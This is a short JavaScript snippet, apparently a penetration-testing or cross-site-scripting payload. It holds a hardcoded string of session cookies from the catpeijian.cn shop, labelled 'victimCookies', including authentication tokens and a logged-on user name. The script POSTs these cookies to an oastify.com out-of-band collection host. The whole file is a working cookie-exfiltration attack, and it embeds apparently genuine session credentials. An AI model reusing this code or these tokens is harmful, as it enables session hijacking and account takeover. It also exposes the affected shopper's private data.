var victimCookies="device_uuid=42557aa1-3352-4e87-be32-f9230f586549; c__utma=2041430959533349110.1395438832.1492027403.1697647577.1707938106.157; MEIQIA_TRACK_ID=2PeXqGFK5nKxjn3hblEPAnnKjZB; MEIQIA_VISIT_ID=2WJZmCmiZjIFsn93sSeKc3J88OX; device_uuid=a327d14a-2f64-402c-bec3-516eccf5438f; __root_domain_v=.catpeijian.cn; _ga_WB3M1YZKBE=GS1.1.1695509093.42.1.1695511909.60.0.0; catEcomm_UsrPrefProv=60055%7CCN-SC; WC_SESSION_ESTABLISHED=true; WC_ACTIVEPOINTER=-7%2C60055; bm_sv=5A5684EC47862521FA5FC64BF41CF822~YAAQj+s/F4Tw8qGNAQAAHBEiqRb7L8Lfzbt/2Xr2xnq+hAjM76oK2gDbRhbOd8GZ4wqDS8Z513McSTcmPrGcYWLo2VDLNsV1HgLuTzbxVFWSOvO3oi5zZfRLWwPWH83MQKZtzZaO/RvXip0rDzu4/qONoZKgbaQMnmxvUdOesMC0BKcgziQUZhAfRmq4a7kQ8jn63PfRpSKIpk0n5mrty418wAXhwDwB7YIdZMESOx/vcua58oN2bad+fu7kcdgqfQaWwA==~1; bm_mi=6A01AC2B91220DCB4411F715BD0B5431~YAAQJJ4QArj3x6iNAQAAKEELqRbiIyEhUnbD1av/gS1XMwS8eEztyDbSCIEZX6baNSZHPaZvS+2sxnqKZiwad8NSCKn+m9th0YkWrLNAmMqES7AKc6cx1m1iiY4tHU6de18L0pMDdAqMLPEIjXMaZZXSGHkGAMtR6tFYuOF02LOeGPAdUYTCN2puhu91DWICwjEOFHN+t4gTvfe23gSso5x5McWajW3PUpdyNKMfBeKeKR1CPJcPhsJawXEegKjKEx1M/GsLxBY4BiOCtYZlt0uq1IHKgWfKuXm8SJDWsrNzd2okPRAArRHGynbIXGWlJoIyEaLyE9NW~1; c__utmc=2041430959533349110.1395438832; changeDefReg_action=; B2C_REDIRECT_URL=TrackOrderStatus%3FcatalogId%3D15005%26storeId%3D60055%26langId%3D-7%26krypto%3DljodeersGxF15cfRYPqCRr0yVUO8bPXwk8YvLeD7q4gW0lHph3sOy04yjOzHvuSNok5m8Hj6BaVV81IpXsc68pqE4%252B1wQRmQ7NuK5ULxr7c%253D; _qddab=3-8hmzkp.lsm6lv19; ADRUM=s=1707939330746&r=https%3A%2F%2Fwww.catpeijian.cn%2FOrderDetail%3F-1410444256; userPSE_22425182=; WC_LogonUserId_60055=David%20Rob12%20DavidT; userPSE_=; REFERRER=http%3A%2F%2Fburpsuite%2F; c__utmb=2041430959533349110.1395438832.1707938106.1707939481.13; _qddaz=QD.441683824528483; _qdda=3-1.3zlfmj; catEcomm_UsrFirstVisit=1; WC_CartOrderId_60055=570646710802; WC_CartTotal_570646710802=99%2B%3B0%3BCNY%3B-7%3Bfalse; _ga=GA1.2.401385136.1683750355; _gid=GA1.2.30794145.1707938112; _ga_C582KJJLSJ=GS1.1.1707938111.8.1.1707939507.34.0.0;WC_AUTHENTICATION_22425182=22425182%2C%2Bqf2a5MmWPMPIa%2BxZSbu4EL625TZ0e%2BSRhWs7UdDb8g%3D; WC_USERACTIVITY_22425182=22425182%2C60055%2C0%2Cnull%2C1707939476135%2C1707953876135%2Cnull%2Cnull%2Cnull%2Cnull%2C2089088704%2CDrOUVN03G6CsvIpLLT34SgNNxHTQO5jDyMJ4wikOPpsDI7ss7maxblE2TLD1Sb6zbeog83oeR0c4myO%2Bfo3rpokl1iTOIKKFh9yj1yZe%2BEr3J3NzkZUugw1bXRBHTjIX%2FYKpVw2EEH9n6HXPyRFD2F1nhp%2BeeGhvbP4mz9IhShmzxVwJYo%2BwZmtyogjqFahmwv1g%2F4ci4oQiEqNxACMEx681bpV4BKkCWc0vvoM9C%2FZknu20e2uTGNroTNSESlIDtDGohH%2BGg82hatx2xafyhw%3D%3D"
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://nh8ei9rwamqc8e6cy8ui8m184zaqyim7.oastify.com/", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    console.log(response);
    // Process the response data here
  } else if (xhr.readyState === 4) {
    console.log('Request failed with status code:', xhr.status);
    // Handle any errors that occur during the request
  }
};

var requestBody = "cookies=" + victimCookies;
xhr.send(requestBody);
